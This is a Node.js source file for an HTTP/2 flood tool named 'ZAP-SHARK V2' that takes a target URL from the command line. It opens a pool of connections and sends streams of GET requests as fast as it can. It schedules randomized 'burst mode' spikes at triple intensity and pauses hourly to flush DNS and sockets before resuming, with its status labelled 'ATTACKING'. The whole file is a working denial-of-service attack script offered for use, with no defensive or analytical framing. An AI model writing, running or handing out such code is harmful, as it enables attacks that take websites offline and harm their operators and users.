const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK_V2 {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // V2 ENHANCEMENT: BURST MODE SETTINGS
        this.mode = "NORMAL"; // "NORMAL" or "BURST"
        this.burstTimer = null;
        this.normalTimer = null;
        this.burstDuration = 7000; // 7 seconds of max aggression
        this.normalDurationMin = 30000; // 30 seconds minimum normal
        this.normalDurationMax = 60000; // 60 seconds maximum normal
        
        // Connection pool
        this.connectionPool = [];
        this.poolSize = 5;
        this.activeStreams = 0;
        this.maxStreamsPerConn = 100;
        
        // RPS tracking by mode
        this.normalRPS = 0;
        this.burstRPS = 0;
        
        // Maintenance
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000;
        this.maintenanceDuration = 600000;
        
        this.attackInterval = null;
    }

    setupConnections() {
        for (let i = 0; i < this.poolSize; i++) {
            setTimeout(() => {
                try {
                    const client = http2.connect(this.targetUrl);
                    client.setMaxListeners(100);
                    
                    client.on('error', () => {});
                    
                    client.on('remoteSettings', (settings) => {
                        if (settings.maxConcurrentStreams) {
                            this.maxStreamsPerConn = Math.min(settings.maxConcurrentStreams, 100);
                        }
                    });
                    
                    this.connectionPool.push(client);
                } catch (err) {}
            }, i * 150);
        }
    }

    sendRequest(intensity = 1) {
        if (this.connectionPool.length === 0) return;

        // Intensity multiplier: 1x for normal, 3x for burst
        const multiplier = this.mode === "BURST" ? 3 : 1;
        const availableStreams = (this.maxStreamsPerConn * this.connectionPool.length) - this.activeStreams;
        const streamsThisTick = Math.min(availableStreams, 2 * multiplier);
        
        for (let i = 0; i < streamsThisTick; i++) {
            const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
            if (!client) continue;

            try {
                this.activeStreams++;
                
                const req = client.request({
                    ':method': 'GET',
                    ':path': '/'
                });
                
                req.on('response', () => {
                    req.destroy();
                });
                
                req.on('error', () => {
                    req.destroy();
                });
                
                req.on('close', () => {
                    this.activeStreams--;
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                    
                    // Track RPS by mode
                    if (this.mode === "BURST") {
                        this.burstRPS = this.currentRPS;
                    } else {
                        this.normalRPS = this.currentRPS;
                    }
                });
                
                req.end();
                
            } catch (err) {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }

    // V2 FEATURE: BURST MODE SCHEDULER
    scheduleBurstMode() {
        // Clear any existing timers
        if (this.burstTimer) clearTimeout(this.burstTimer);
        if (this.normalTimer) clearTimeout(this.normalTimer);
        
        // Calculate random normal duration (30-60 seconds)
        const normalDuration = this.normalDurationMin + 
                              Math.random() * (this.normalDurationMax - this.normalDurationMin);
        
        // Schedule next burst
        this.normalTimer = setTimeout(() => {
            console.log(`\n[V2] 🚀 ENTERING BURST MODE (7s MAX AGGRESSION)`);
            this.mode = "BURST";
            
            // Schedule return to normal
            this.burstTimer = setTimeout(() => {
                console.log(`[V2] ⏸️  RETURNING TO NORMAL MODE`);
                this.mode = "NORMAL";
                this.scheduleBurstMode(); // Restart cycle
            }, this.burstDuration);
            
        }, normalDuration);
    }

    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60) % 60;
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        const modeIndicator = this.mode === "BURST" ? "🚀" : "⚡";
        
        process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) ` +
                           `TOTAL: ${this.totalRequests} | ` +
                           `RPS: ${this.currentRPS.toFixed(1)} ${modeIndicator} ` +
                           `[${this.mode}]`);
    }

    flushDNS() {
        if (os.platform() === 'win32') {
            exec('ipconfig /flushdns >nul 2>&1', () => {});
        } else {
            exec('sudo dscacheutil -flushcache 2>/dev/null || true', () => {});
        }
    }

    flushSockets() {
        this.connectionPool.forEach(client => {
            try { client.destroy(); } catch (err) {}
        });
        this.connectionPool = [];
        this.activeStreams = 0;
    }

    checkMaintenance() {
        const currentTime = Date.now();
        const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
        
        if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
            this.status = "PAUSED";
            
            if (this.attackInterval) clearInterval(this.attackInterval);
            if (this.burstTimer) clearTimeout(this.burstTimer);
            if (this.normalTimer) clearTimeout(this.normalTimer);
            
            this.flushDNS();
            this.flushSockets();
            
            setTimeout(() => {
                this.status = "ATTACKING";
                this.lastMaintenance = Date.now();
                this.setupConnections();
                setTimeout(() => {
                    this.startAttack();
                    this.scheduleBurstMode(); // Restart burst scheduler
                }, 1000);
            }, this.maintenanceDuration);
        }
    }

    startAttack() {
        if (this.attackInterval) clearInterval(this.attackInterval);
        
        this.attackInterval = setInterval(() => {
            if (this.status === "ATTACKING") {
                // V2: Different intensity based on mode
                const intensity = this.mode === "BURST" ? 3 : 1;
                this.sendRequest(intensity);
                this.updateDisplay();
            }
        }, 0.1);
    }

    start() {
        this.lastMaintenance = Date.now();
        
        console.log("=== ZAP-SHARK V2 - BURST MODE ===");
        console.log("Target:", this.targetUrl);
        console.log("Pattern: 30-60s Normal + 7s MAX BURST");
        console.log("Mode: Continuous RPS + Aggressive Spikes");
        console.log("=".repeat(50));
        
        this.setupConnections();
        
        setTimeout(() => {
            this.startAttack();
            this.scheduleBurstMode(); // Start burst scheduler
        }, 2000);
        
        // Maintenance checker
        setInterval(() => this.checkMaintenance(), 1000);
        
        // Connection health
        setInterval(() => {
            if (this.connectionPool.length < this.poolSize && this.status === "ATTACKING") {
                this.setupConnections();
            }
        }, 10000);
        
        process.on('SIGINT', () => {
            this.running = false;
            if (this.attackInterval) clearInterval(this.attackInterval);
            if (this.burstTimer) clearTimeout(this.burstTimer);
            if (this.normalTimer) clearTimeout(this.normalTimer);
            this.flushSockets();
            console.log('\n=== ZAP-SHARK V2 STOPPED ===');
            process.exit(0);
        });
    }
}

// Usage
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v2.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK_V2(target);
shark.start();
